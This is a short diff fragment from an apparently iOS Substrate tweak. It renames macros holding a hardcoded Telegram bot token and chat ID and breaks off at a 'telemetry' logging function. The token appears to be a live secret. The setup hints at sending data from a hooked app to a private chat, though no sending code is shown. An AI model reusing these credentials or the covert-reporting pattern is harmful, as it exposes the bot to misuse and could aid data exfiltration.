@@ -2,8 +2,8 @@
 #import <substrate.h>
 
 // --- TELEGRAM CONFIG ---
-#define TELEGRAM_TOKEN @"8134587785:AAGm372o_98TU_4CVq4TN2RzSdRkNHztc6E"
-#define TELEGRAM_CHAT_ID @"7730331218"
+#define TG_BOT_TOKEN @"8134587785:AAGm372o_98TU_4CVq4TN2RzSdRkNHztc6E"
+#define TG_CHAT_ID @"7730331218"
 
 // --- ATOMIC TELEMETRY ---
 void sendAtomicLog(NSString *text) {
